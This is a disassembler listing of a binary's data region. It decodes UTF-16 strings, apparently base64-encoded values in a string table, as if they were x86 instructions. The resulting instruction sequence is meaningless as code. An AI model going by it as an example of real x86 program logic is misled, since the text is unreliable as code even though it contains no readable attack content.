  40b126:	00 39                	add    %bh,(%ecx)
  40b128:	00 61 00             	add    %ah,0x0(%ecx)
  40b12b:	74 00                	je     0x40b12d
  40b12d:	31 00                	xor    %eax,(%eax)
  40b12f:	50                   	push   %eax
  40b130:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  40b134:	00 67 00             	add    %ah,0x0(%edi)
  40b137:	37                   	aaa
  40b138:	00 78 00             	add    %bh,0x0(%eax)
  40b13b:	78 00                	js     0x40b13d
  40b13d:	38 00                	cmp    %al,(%eax)
  40b13f:	6a 00                	push   $0x0
  40b141:	44                   	inc    %esp
  40b142:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  40b146:	00 6e 00             	add    %ch,0x0(%esi)
  40b149:	38 00                	cmp    %al,(%eax)
  40b14b:	4a                   	dec    %edx
  40b14c:	00 69 00             	add    %ch,0x0(%ecx)
  40b14f:	7a 00                	jp     0x40b151
  40b151:	48                   	dec    %eax
  40b152:	00 5a 00             	add    %bl,0x0(%edx)
  40b155:	35 00 6c 00 6e       	xor    $0x6e006c00,%eax
  40b15a:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40b15e:	00 4f 00             	add    %cl,0x0(%edi)
  40b161:	37                   	aaa
  40b162:	00 5a 00             	add    %bl,0x0(%edx)
  40b165:	62 00                	bound  %eax,(%eax)
  40b167:	49                   	dec    %ecx
  40b168:	00 58 00             	add    %bl,0x0(%eax)
  40b16b:	77 00                	ja     0x40b16d
  40b16d:	7a 00                	jp     0x40b16f
  40b16f:	59                   	pop    %ecx
  40b170:	00 35 00 2b 00 77    	add    %dh,0x77002b00
  40b176:	00 6e 00             	add    %ch,0x0(%esi)
  40b179:	72 00                	jb     0x40b17b
  40b17b:	41                   	inc    %ecx
  40b17c:	00 31                	add    %dh,(%ecx)
  40b17e:	00 41 00             	add    %al,0x0(%ecx)
  40b181:	33 00                	xor    (%eax),%eax
  40b183:	69 00 77 00 73 00    	imul   $0x730077,(%eax),%eax
  40b189:	5a                   	pop    %edx
  40b18a:	00 46 00             	add    %al,0x0(%esi)
  40b18d:	46                   	inc    %esi
  40b18e:	00 4e 00             	add    %cl,0x0(%esi)
  40b191:	73 00                	jae    0x40b193
  40b193:	59                   	pop    %ecx
  40b194:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  40b198:	00 51 00             	add    %dl,0x0(%ecx)
  40b19b:	50                   	push   %eax
  40b19c:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  40b1a0:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  40b1a4:	00 65 00             	add    %ah,0x0(%ebp)
  40b1a7:	50                   	push   %eax
  40b1a8:	00 70 00             	add    %dh,0x0(%eax)
  40b1ab:	76 00                	jbe    0x40b1ad
  40b1ad:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1ae:	00 77 00             	add    %dh,0x0(%edi)
  40b1b1:	57                   	push   %edi
  40b1b2:	00 46 00             	add    %al,0x0(%esi)
  40b1b5:	67 00 2b             	add    %ch,(%bp,%di)
  40b1b8:	00 36                	add    %dh,(%esi)
  40b1ba:	00 43 00             	add    %al,0x0(%ebx)
  40b1bd:	68 00 6b 00 58       	push   $0x58006b00
  40b1c2:	00 38                	add    %bh,(%eax)
  40b1c4:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  40b1c8:	00 71 00             	add    %dh,0x0(%ecx)
  40b1cb:	4d                   	dec    %ebp
  40b1cc:	00 62 00             	add    %ah,0x0(%edx)
  40b1cf:	68 00 74 00 30       	push   $0x30007400
  40b1d4:	00 2f                	add    %ch,(%edi)
  40b1d6:	00 77 00             	add    %dh,0x0(%edi)
  40b1d9:	39 00                	cmp    %eax,(%eax)
  40b1db:	68 00 47 00 31       	push   $0x31004700
  40b1e0:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40b1e4:	00 6b 00             	add    %ch,0x0(%ebx)
  40b1e7:	66 00 64 00 6d       	data16 add %ah,0x6d(%eax,%eax,1)
  40b1ec:	00 31                	add    %dh,(%ecx)
  40b1ee:	00 49 00             	add    %cl,0x0(%ecx)
  40b1f1:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40b1f5:	68 00 2b 00 59       	push   $0x59002b00
  40b1fa:	00 4a 00             	add    %cl,0x0(%edx)
  40b1fd:	52                   	push   %edx
  40b1fe:	00 6e 00             	add    %ch,0x0(%esi)
  40b201:	73 00                	jae    0x40b203
  40b203:	49                   	dec    %ecx
  40b204:	00 35 00 37 00 43    	add    %dh,0x43003700
  40b20a:	00 52 00             	add    %dl,0x0(%edx)
  40b20d:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40b211:	48                   	dec    %eax
  40b212:	00 48 00             	add    %cl,0x0(%eax)
  40b215:	7a 00                	jp     0x40b217
  40b217:	41                   	inc    %ecx
  40b218:	00 5a 00             	add    %bl,0x0(%edx)
  40b21b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b21c:	00 70 00             	add    %dh,0x0(%eax)
  40b21f:	31 00                	xor    %eax,(%eax)
  40b221:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b225:	47                   	inc    %edi
  40b226:	00 70 00             	add    %dh,0x0(%eax)
  40b229:	32 00                	xor    (%eax),%al
  40b22b:	5a                   	pop    %edx
  40b22c:	00 70 00             	add    %dh,0x0(%eax)
  40b22f:	43                   	inc    %ebx
  40b230:	00 2f                	add    %ch,(%edi)
  40b232:	00 6d 00             	add    %ch,0x0(%ebp)
  40b235:	4e                   	dec    %esi
  40b236:	00 45 00             	add    %al,0x0(%ebp)
  40b239:	57                   	push   %edi
  40b23a:	00 2f                	add    %ch,(%edi)
  40b23c:	00 57 00             	add    %dl,0x0(%edi)
  40b23f:	4d                   	dec    %ebp
  40b240:	00 62 00             	add    %ah,0x0(%edx)
  40b243:	59                   	pop    %ecx
  40b244:	00 36                	add    %dh,(%esi)
  40b246:	00 45 00             	add    %al,0x0(%ebp)
  40b249:	47                   	inc    %edi
  40b24a:	00 2b                	add    %ch,(%ebx)
  40b24c:	00 75 00             	add    %dh,0x0(%ebp)
  40b24f:	34 00                	xor    $0x0,%al
  40b251:	50                   	push   %eax
  40b252:	00 37                	add    %dh,(%edi)
  40b254:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40b258:	00 70 00             	add    %dh,0x0(%eax)
  40b25b:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40b25f:	63 00                	arpl   %eax,(%eax)
  40b261:	78 00                	js     0x40b263
  40b263:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40b267:	54                   	push   %esp
  40b268:	00 36                	add    %dh,(%esi)
  40b26a:	00 6b 00             	add    %ch,0x0(%ebx)
  40b26d:	70 00                	jo     0x40b26f
  40b26f:	69 00 67 00 49 00    	imul   $0x490067,(%eax),%eax
  40b275:	42                   	inc    %edx
  40b276:	00 49 00             	add    %cl,0x0(%ecx)
  40b279:	30 00                	xor    %al,(%eax)
  40b27b:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40b27f:	36 00 33             	add    %dh,%ss:(%ebx)
  40b282:	00 56 00             	add    %dl,0x0(%esi)
  40b285:	30 00                	xor    %al,(%eax)
  40b287:	33 00                	xor    (%eax),%eax
  40b289:	77 00                	ja     0x40b28b
  40b28b:	4b                   	dec    %ebx
  40b28c:	00 67 00             	add    %ah,0x0(%edi)
  40b28f:	68 00 51 00 76       	push   $0x76005100
  40b294:	00 65 00             	add    %ah,0x0(%ebp)
  40b297:	34 00                	xor    $0x0,%al
  40b299:	6e                   	outsb  %ds:(%esi),(%dx)
  40b29a:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40b29e:	00 2f                	add    %ch,(%edi)
  40b2a0:	00 65 00             	add    %ah,0x0(%ebp)
  40b2a3:	4c                   	dec    %esp
  40b2a4:	00 53 00             	add    %dl,0x0(%ebx)
  40b2a7:	2b 00                	sub    (%eax),%eax
  40b2a9:	35 00 32 00 6a       	xor    $0x6a003200,%eax
  40b2ae:	00 6a 00             	add    %ch,0x0(%edx)
  40b2b1:	44                   	inc    %esp
  40b2b2:	00 4b 00             	add    %cl,0x0(%ebx)
  40b2b5:	2f                   	das
  40b2b6:	00 43 00             	add    %al,0x0(%ebx)
  40b2b9:	37                   	aaa
  40b2ba:	00 75 00             	add    %dh,0x0(%ebp)
  40b2bd:	44                   	inc    %esp
  40b2be:	00 52 00             	add    %dl,0x0(%edx)
  40b2c1:	34 00                	xor    $0x0,%al
  40b2c3:	30 00                	xor    %al,(%eax)
  40b2c5:	34 00                	xor    $0x0,%al
  40b2c7:	72 00                	jb     0x40b2c9
  40b2c9:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  40b2cc:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  40b2d0:	00 4c 00 76          	add    %cl,0x76(%eax,%eax,1)
  40b2d4:	00 71 00             	add    %dh,0x0(%ecx)
  40b2d7:	69 00 38 00 63 00    	imul   $0x630038,(%eax),%eax
  40b2dd:	58                   	pop    %eax
  40b2de:	00 72 00             	add    %dh,0x0(%edx)
  40b2e1:	47                   	inc    %edi
  40b2e2:	00 75 00             	add    %dh,0x0(%ebp)
  40b2e5:	45                   	inc    %ebp
  40b2e6:	00 56 00             	add    %dl,0x0(%esi)
  40b2e9:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  40b2ed:	68 00 4d 00 38       	push   $0x38004d00
  40b2f2:	00 4d 00             	add    %cl,0x0(%ebp)
  40b2f5:	37                   	aaa
  40b2f6:	00 62 00             	add    %ah,0x0(%edx)
  40b2f9:	63 00                	arpl   %eax,(%eax)
  40b2fb:	68 00 5a 00 69       	push   $0x69005a00
  40b300:	00 62 00             	add    %ah,0x0(%edx)
  40b303:	77 00                	ja     0x40b305
  40b305:	6f                   	outsl  %ds:(%esi),(%dx)
  40b306:	00 4f 00             	add    %cl,0x0(%edi)
  40b309:	58                   	pop    %eax
  40b30a:	00 58 00             	add    %bl,0x0(%eax)
  40b30d:	52                   	push   %edx
  40b30e:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40b312:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  40b316:	00 42 00             	add    %al,0x0(%edx)
  40b319:	2f                   	das
  40b31a:	00 4f 00             	add    %cl,0x0(%edi)
  40b31d:	4c                   	dec    %esp
  40b31e:	00 6b 00             	add    %ch,0x0(%ebx)
  40b321:	41                   	inc    %ecx
  40b322:	00 62 00             	add    %ah,0x0(%edx)
  40b325:	7a 00                	jp     0x40b327
  40b327:	32 00                	xor    (%eax),%al
  40b329:	35 00 6a 00 43       	xor    $0x43006a00,%eax
  40b32e:	00 79 00             	add    %bh,0x0(%ecx)
  40b331:	53                   	push   %ebx
  40b332:	00 4a 00             	add    %cl,0x0(%edx)
  40b335:	6f                   	outsl  %ds:(%esi),(%dx)
  40b336:	00 6e 00             	add    %ch,0x0(%esi)
  40b339:	6a 00                	push   $0x0
  40b33b:	38 00                	cmp    %al,(%eax)
  40b33d:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40b341:	53                   	push   %ebx
  40b342:	00 6b 00             	add    %ch,0x0(%ebx)
  40b345:	53                   	push   %ebx
  40b346:	00 33                	add    %dh,(%ebx)
  40b348:	00 63 00             	add    %ah,0x0(%ebx)
  40b34b:	4f                   	dec    %edi
  40b34c:	00 4a 00             	add    %cl,0x0(%edx)
  40b34f:	42                   	inc    %edx
  40b350:	00 32                	add    %dh,(%edx)
  40b352:	00 4f 00             	add    %cl,0x0(%edi)
  40b355:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40b358:	00 30                	add    %dh,(%eax)
  40b35a:	00 48 00             	add    %cl,0x0(%eax)
  40b35d:	34 00                	xor    $0x0,%al
  40b35f:	5a                   	pop    %edx
  40b360:	00 79 00             	add    %bh,0x0(%ecx)
  40b363:	33 00                	xor    (%eax),%eax
  40b365:	62 00                	bound  %eax,(%eax)
  40b367:	79 00                	jns    0x40b369
  40b369:	55                   	push   %ebp
  40b36a:	00 4f 00             	add    %cl,0x0(%edi)
  40b36d:	72 00                	jb     0x40b36f
  40b36f:	77 00                	ja     0x40b371
  40b371:	31 00                	xor    %eax,(%eax)
  40b373:	44                   	inc    %esp
  40b374:	00 63 00             	add    %ah,0x0(%ebx)
  40b377:	63 00                	arpl   %eax,(%eax)
  40b379:	5a                   	pop    %edx
  40b37a:	00 75 00             	add    %dh,0x0(%ebp)
  40b37d:	55                   	push   %ebp
  40b37e:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  40b382:	00 53 00             	add    %dl,0x0(%ebx)
  40b385:	6f                   	outsl  %ds:(%esi),(%dx)
  40b386:	00 4d 00             	add    %cl,0x0(%ebp)
  40b389:	43                   	inc    %ebx
  40b38a:	00 2f                	add    %ch,(%edi)
  40b38c:	00 75 00             	add    %dh,0x0(%ebp)
  40b38f:	4f                   	dec    %edi
  40b390:	00 70 00             	add    %dh,0x0(%eax)
  40b393:	34 00                	xor    $0x0,%al
  40b395:	42                   	inc    %edx
  40b396:	00 77 00             	add    %dh,0x0(%edi)
  40b399:	78 00                	js     0x40b39b
  40b39b:	4a                   	dec    %edx
  40b39c:	00 49 00             	add    %cl,0x0(%ecx)
  40b39f:	79 00                	jns    0x40b3a1
  40b3a1:	4c                   	dec    %esp
  40b3a2:	00 49 00             	add    %cl,0x0(%ecx)
  40b3a5:	73 00                	jae    0x40b3a7
  40b3a7:	56                   	push   %esi
  40b3a8:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  40b3ac:	00 72 00             	add    %dh,0x0(%edx)
  40b3af:	58                   	pop    %eax
  40b3b0:	00 49 00             	add    %cl,0x0(%ecx)
  40b3b3:	41                   	inc    %ecx
  40b3b4:	00 5a 00             	add    %bl,0x0(%edx)
  40b3b7:	6c                   	insb   (%dx),%es:(%edi)
  40b3b8:	00 77 00             	add    %dh,0x0(%edi)
  40b3bb:	64 00 32             	add    %dh,%fs:(%edx)
  40b3be:	00 77 00             	add    %dh,0x0(%edi)
  40b3c1:	54                   	push   %esp
  40b3c2:	00 33                	add    %dh,(%ebx)
  40b3c4:	00 36                	add    %dh,(%esi)
  40b3c6:	00 51 00             	add    %dl,0x0(%ecx)
  40b3c9:	77 00                	ja     0x40b3cb
  40b3cb:	73 00                	jae    0x40b3cd
  40b3cd:	41                   	inc    %ecx
  40b3ce:	00 78 00             	add    %bh,0x0(%eax)
  40b3d1:	46                   	inc    %esi
  40b3d2:	00 66 00             	add    %ah,0x0(%esi)
  40b3d5:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  40b3d9:	65 00 2b             	add    %ch,%gs:(%ebx)
  40b3dc:	00 78 00             	add    %bh,0x0(%eax)
  40b3df:	64 00 44 00 67       	add    %al,%fs:0x67(%eax,%eax,1)
  40b3e4:	00 42 00             	add    %al,0x0(%edx)
  40b3e7:	2f                   	das
  40b3e8:	00 65 00             	add    %ah,0x0(%ebp)
  40b3eb:	32 00                	xor    (%eax),%al
  40b3ed:	69 00 54 00 4e 00    	imul   $0x4e0054,(%eax),%eax
  40b3f3:	39 00                	cmp    %eax,(%eax)
  40b3f5:	4b                   	dec    %ebx
  40b3f6:	00 4b 00             	add    %cl,0x0(%ebx)
  40b3f9:	39 00                	cmp    %eax,(%eax)
  40b3fb:	34 00                	xor    $0x0,%al
  40b3fd:	33 00                	xor    (%eax),%eax
  40b3ff:	32 00                	xor    (%eax),%al
  40b401:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40b404:	00 72 00             	add    %dh,0x0(%edx)
  40b407:	63 00                	arpl   %eax,(%eax)
  40b409:	49                   	dec    %ecx
  40b40a:	00 65 00             	add    %ah,0x0(%ebp)
  40b40d:	63 00                	arpl   %eax,(%eax)
  40b40f:	51                   	push   %ecx
  40b410:	00 2f                	add    %ch,(%edi)
  40b412:	00 58 00             	add    %bl,0x0(%eax)
  40b415:	48                   	dec    %eax
  40b416:	00 79 00             	add    %bh,0x0(%ecx)
  40b419:	49                   	dec    %ecx
  40b41a:	00 70 00             	add    %dh,0x0(%eax)
  40b41d:	52                   	push   %edx
  40b41e:	00 6b 00             	add    %ch,0x0(%ebx)
  40b421:	79 00                	jns    0x40b423
  40b423:	56                   	push   %esi
  40b424:	00 6e 00             	add    %ch,0x0(%esi)
  40b427:	4f                   	dec    %edi
  40b428:	00 6b 00             	add    %ch,0x0(%ebx)
  40b42b:	57                   	push   %edi
  40b42c:	00 6a 00             	add    %ch,0x0(%edx)
  40b42f:	38 00                	cmp    %al,(%eax)
  40b431:	56                   	push   %esi
  40b432:	00 6e 00             	add    %ch,0x0(%esi)
  40b435:	65 00 74 00 5a       	add    %dh,%gs:0x5a(%eax,%eax,1)
  40b43a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b43d:	51                   	push   %ecx
  40b43e:	00 33                	add    %dh,(%ebx)
  40b440:	00 76 00             	add    %dh,0x0(%esi)
  40b443:	6a 00                	push   $0x0
  40b445:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  40b449:	45                   	inc    %ebp
  40b44a:	00 49 00             	add    %cl,0x0(%ecx)
  40b44d:	66 00 70 00          	data16 add %dh,0x0(%eax)
  40b451:	44                   	inc    %esp
  40b452:	00 78 00             	add    %bh,0x0(%eax)
  40b455:	67 00 36 00 2f       	add    %dh,0x2f00
  40b45a:	00 67 00             	add    %ah,0x0(%edi)
  40b45d:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b462:	80 b1 64 00 46 00 71 	xorb   $0x71,0x460064(%ecx)
  40b469:	00 59 00             	add    %bl,0x0(%ecx)
  40b46c:	33 00                	xor    (%eax),%eax
  40b46e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b46f:	00 6f 00             	add    %ch,0x0(%edi)
  40b472:	43                   	inc    %ebx
  40b473:	00 59 00             	add    %bl,0x0(%ecx)
  40b476:	45                   	inc    %ebp
  40b477:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40b47b:	00 6e 00             	add    %ch,0x0(%esi)
  40b47e:	51                   	push   %ecx
  40b47f:	00 63 00             	add    %ah,0x0(%ebx)
  40b482:	63 00                	arpl   %eax,(%eax)
  40b484:	55                   	push   %ebp
  40b485:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b488:	32 00                	xor    (%eax),%al
  40b48a:	6d                   	insl   (%dx),%es:(%edi)
  40b48b:	00 37                	add    %dh,(%edi)
  40b48d:	00 2b                	add    %ch,(%ebx)
  40b48f:	00 6b 00             	add    %ch,0x0(%ebx)
  40b492:	33 00                	xor    (%eax),%eax
  40b494:	72 00                	jb     0x40b496
  40b496:	37                   	aaa
  40b497:	00 67 00             	add    %ah,0x0(%edi)
  40b49a:	37                   	aaa
  40b49b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b49e:	68 00 45 00 6e       	push   $0x6e004500
  40b4a3:	00 50 00             	add    %dl,0x0(%eax)
  40b4a6:	59                   	pop    %ecx
  40b4a7:	00 62 00             	add    %ah,0x0(%edx)
  40b4aa:	59                   	pop    %ecx
  40b4ab:	00 77 00             	add    %dh,0x0(%edi)
  40b4ae:	4d                   	dec    %ebp
  40b4af:	00 30                	add    %dh,(%eax)
  40b4b1:	00 77 00             	add    %dh,0x0(%edi)
  40b4b4:	35 00 62 00 62       	xor    $0x62006200,%eax
  40b4b9:	00 78 00             	add    %bh,0x0(%eax)
  40b4bc:	47                   	inc    %edi
  40b4bd:	00 55 00             	add    %dl,0x0(%ebp)
  40b4c0:	6a 00                	push   $0x0
  40b4c2:	37                   	aaa
  40b4c3:	00 77 00             	add    %dh,0x0(%edi)
  40b4c6:	4b                   	dec    %ebx
  40b4c7:	00 65 00             	add    %ah,0x0(%ebp)
  40b4ca:	58                   	pop    %eax
  40b4cb:	00 51 00             	add    %dl,0x0(%ecx)
  40b4ce:	69 00 39 00 6b 00    	imul   $0x6b0039,(%eax),%eax
  40b4d4:	2b 00                	sub    (%eax),%eax
  40b4d6:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4d7:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b4db:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40b4df:	00 51 00             	add    %dl,0x0(%ecx)
  40b4e2:	37                   	aaa
  40b4e3:	00 70 00             	add    %dh,0x0(%eax)
  40b4e6:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40b4ea:	47                   	inc    %edi
  40b4eb:	00 37                	add    %dh,(%edi)
  40b4ed:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40b4f1:	00 37                	add    %dh,(%edi)
  40b4f3:	00 78 00             	add    %bh,0x0(%eax)
  40b4f6:	6a 00                	push   $0x0
  40b4f8:	56                   	push   %esi
  40b4f9:	00 42 00             	add    %al,0x0(%edx)
  40b4fc:	38 00                	cmp    %al,(%eax)
  40b4fe:	62 00                	bound  %eax,(%eax)
  40b500:	62 00                	bound  %eax,(%eax)
  40b502:	58                   	pop    %eax
  40b503:	00 63 00             	add    %ah,0x0(%ebx)
  40b506:	65 00 33             	add    %dh,%gs:(%ebx)
  40b509:	00 38                	add    %bh,(%eax)
  40b50b:	00 57 00             	add    %dl,0x0(%edi)
  40b50e:	51                   	push   %ecx
  40b50f:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b515:	80 b1 6c 00 64 00 44 	xorb   $0x44,0x64006c(%ecx)
  40b51c:	00 71 00             	add    %dh,0x0(%ecx)
  40b51f:	45                   	inc    %ebp
  40b520:	00 50 00             	add    %dl,0x0(%eax)
  40b523:	41                   	inc    %ecx
  40b524:	00 61 00             	add    %ah,0x0(%ecx)
  40b527:	30 00                	xor    %al,(%eax)
  40b529:	6c                   	insb   (%dx),%es:(%edi)
  40b52a:	00 75 00             	add    %dh,0x0(%ebp)
  40b52d:	39 00                	cmp    %eax,(%eax)
  40b52f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b530:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40b534:	00 4d 00             	add    %cl,0x0(%ebp)
  40b537:	76 00                	jbe    0x40b539
  40b539:	6b 00 56             	imul   $0x56,(%eax),%eax
  40b53c:	00 6e 00             	add    %ch,0x0(%esi)
  40b53f:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40b543:	72 00                	jb     0x40b545
  40b545:	41                   	inc    %ecx
  40b546:	00 59 00             	add    %bl,0x0(%ecx)
  40b549:	70 00                	jo     0x40b54b
  40b54b:	55                   	push   %ebp
  40b54c:	00 56 00             	add    %dl,0x0(%esi)
  40b54f:	50                   	push   %eax
  40b550:	00 78 00             	add    %bh,0x0(%eax)
  40b553:	59                   	pop    %ecx
  40b554:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  40b558:	00 68 00             	add    %ch,0x0(%eax)
  40b55b:	71 00                	jno    0x40b55d
  40b55d:	6b 00 55             	imul   $0x55,(%eax),%eax
  40b560:	00 53 00             	add    %dl,0x0(%ebx)
  40b563:	49                   	dec    %ecx
  40b564:	00 33                	add    %dh,(%ebx)
  40b566:	00 5a 00             	add    %bl,0x0(%edx)
  40b569:	77 00                	ja     0x40b56b
  40b56b:	73 00                	jae    0x40b56d
  40b56d:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  40b571:	58                   	pop    %eax
  40b572:	00 45 00             	add    %al,0x0(%ebp)
  40b575:	6c                   	insb   (%dx),%es:(%edi)
  40b576:	00 5a 00             	add    %bl,0x0(%edx)
  40b579:	7a 00                	jp     0x40b57b
  40b57b:	64 00 74 00 42       	add    %dh,%fs:0x42(%eax,%eax,1)
  40b580:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40b584:	00 42 00             	add    %al,0x0(%edx)
  40b587:	2b 00                	sub    (%eax),%eax
  40b589:	37                   	aaa
  40b58a:	00 47 00             	add    %al,0x0(%edi)
  40b58d:	5a                   	pop    %edx
  40b58e:	00 4b 00             	add    %cl,0x0(%ebx)
  40b591:	31 00                	xor    %eax,(%eax)
  40b593:	6e                   	outsb  %ds:(%esi),(%dx)
  40b594:	00 4d 00             	add    %cl,0x0(%ebp)
  40b597:	63 00                	arpl   %eax,(%eax)
  40b599:	69 00 4c 00 6a 00    	imul   $0x6a004c,(%eax),%eax
  40b59f:	38 00                	cmp    %al,(%eax)
  40b5a1:	53                   	push   %ebx
  40b5a2:	00 55 00             	add    %dl,0x0(%ebp)
  40b5a5:	32 00                	xor    (%eax),%al
  40b5a7:	66 00 4c 00 61       	data16 add %cl,0x61(%eax,%eax,1)
  40b5ac:	00 66 00             	add    %ah,0x0(%esi)
  40b5af:	68 00 43 00 51       	push   $0x51004300
  40b5b4:	00 42 00             	add    %al,0x0(%edx)
  40b5b7:	71 00                	jno    0x40b5b9
  40b5b9:	48                   	dec    %eax
  40b5ba:	00 66 00             	add    %ah,0x0(%esi)
  40b5bd:	75 00                	jne    0x40b5bf
  40b5bf:	34 00                	xor    $0x0,%al
  40b5c1:	51                   	push   %ecx
  40b5c2:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b5c8:	80 b1 37 00 35 00 63 	xorb   $0x63,0x350037(%ecx)
  40b5cf:	00 44 00 31          	add    %al,0x31(%eax,%eax,1)
  40b5d3:	00 2f                	add    %ch,(%edi)
  40b5d5:	00 7a 00             	add    %bh,0x0(%edx)
  40b5d8:	74 00                	je     0x40b5da
  40b5da:	54                   	push   %esp
  40b5db:	00 47 00             	add    %al,0x0(%edi)
  40b5de:	38 00                	cmp    %al,(%eax)
  40b5e0:	49                   	dec    %ecx
  40b5e1:	00 6b 00             	add    %ch,0x0(%ebx)
  40b5e4:	55                   	push   %ebp
  40b5e5:	00 75 00             	add    %dh,0x0(%ebp)
  40b5e8:	2f                   	das
  40b5e9:	00 6f 00             	add    %ch,0x0(%edi)
  40b5ec:	35 00 6d 00 59       	xor    $0x59006d00,%eax
  40b5f1:	00 49 00             	add    %cl,0x0(%ecx)
  40b5f4:	66 00 7a 00          	data16 add %bh,0x0(%edx)
  40b5f8:	61                   	popa
  40b5f9:	00 6d 00             	add    %ch,0x0(%ebp)
  40b5fc:	59                   	pop    %ecx
  40b5fd:	00 48 00             	add    %cl,0x0(%eax)
  40b600:	4f                   	dec    %edi
  40b601:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  40b605:	00 71 00             	add    %dh,0x0(%ecx)
  40b608:	45                   	inc    %ebp
  40b609:	00 33                	add    %dh,(%ebx)
  40b60b:	00 5a 00             	add    %bl,0x0(%edx)
  40b60e:	32 00                	xor    (%eax),%al
  40b610:	4b                   	dec    %ebx
  40b611:	00 52 00             	add    %dl,0x0(%edx)
  40b614:	49                   	dec    %ecx
  40b615:	00 63 00             	add    %ah,0x0(%ebx)
  40b618:	6a 00                	push   $0x0
  40b61a:	33 00                	xor    (%eax),%eax
  40b61c:	6a 00                	push   $0x0
  40b61e:	6c                   	insb   (%dx),%es:(%edi)
  40b61f:	00 2f                	add    %ch,(%edi)
  40b621:	00 52 00             	add    %dl,0x0(%edx)
  40b624:	73 00                	jae    0x40b626
  40b626:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40b62a:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40b62e:	2f                   	das
  40b62f:	00 62 00             	add    %ah,0x0(%edx)
  40b632:	55                   	push   %ebp
  40b633:	00 4c 00 6b          	add    %cl,0x6b(%eax,%eax,1)
  40b637:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40b63b:	00 56 00             	add    %dl,0x0(%esi)
  40b63e:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40b642:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40b645:	00 73 00             	add    %dh,0x0(%ebx)
  40b648:	37                   	aaa
  40b649:	00 61 00             	add    %ah,0x0(%ecx)
  40b64c:	31 00                	xor    %eax,(%eax)
  40b64e:	37                   	aaa
  40b64f:	00 4e 00             	add    %cl,0x0(%esi)
  40b652:	38 00                	cmp    %al,(%eax)
  40b654:	39 00                	cmp    %eax,(%eax)
  40b656:	79 00                	jns    0x40b658
  40b658:	69 00 7a 00 43 00    	imul   $0x43007a,(%eax),%eax
  40b65e:	4c                   	dec    %esp
  40b65f:	00 4b 00             	add    %cl,0x0(%ebx)
  40b662:	76 00                	jbe    0x40b664
  40b664:	67 00 55 00          	add    %dl,0x0(%di)
  40b668:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40b66c:	7a 00                	jp     0x40b66e
  40b66e:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b672:	32 00                	xor    (%eax),%al
  40b674:	51                   	push   %ecx
  40b675:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b67b:	03 33                	add    (%ebx),%esi
  40b67d:	00 00                	add    %al,(%eax)
  40b67f:	80 b1 54 00 37 00 67 	xorb   $0x67,0x370054(%ecx)
  40b686:	00 37                	add    %dh,(%edi)
  40b688:	00 77 00             	add    %dh,0x0(%edi)
  40b68b:	72 00                	jb     0x40b68d
  40b68d:	42                   	inc    %edx
  40b68e:	00 4f 00             	add    %cl,0x0(%edi)
  40b691:	38 00                	cmp    %al,(%eax)
  40b693:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40b697:	69 00 62 00 38 00    	imul   $0x380062,(%eax),%eax
  40b69d:	50                   	push   %eax
  40b69e:	00 6a 00             	add    %ch,0x0(%edx)
  40b6a1:	4a                   	dec    %edx
  40b6a2:	00 45 00             	add    %al,0x0(%ebp)
  40b6a5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6a6:	00 39                	add    %bh,(%ecx)
  40b6a8:	00 53 00             	add    %dl,0x0(%ebx)
  40b6ab:	6a 00                	push   $0x0
